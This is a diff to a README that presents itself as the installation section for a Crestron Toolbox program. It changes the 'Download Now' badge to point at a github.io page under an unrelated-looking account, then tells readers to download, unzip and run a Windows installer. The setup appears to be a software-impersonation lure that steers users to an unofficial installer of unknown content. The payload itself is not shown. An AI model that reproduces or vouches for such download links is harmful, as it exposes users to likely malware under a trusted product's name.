@@ -8,7 +8,7 @@ With real-time communication, logging, and firmware update capabilities, it’s 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-navy?style=for-the-badge)](https://git-download.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-navy?style=for-the-badge)](https://dragosstudiobrisbone.github.io/.github/Crestron-Toolbox)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
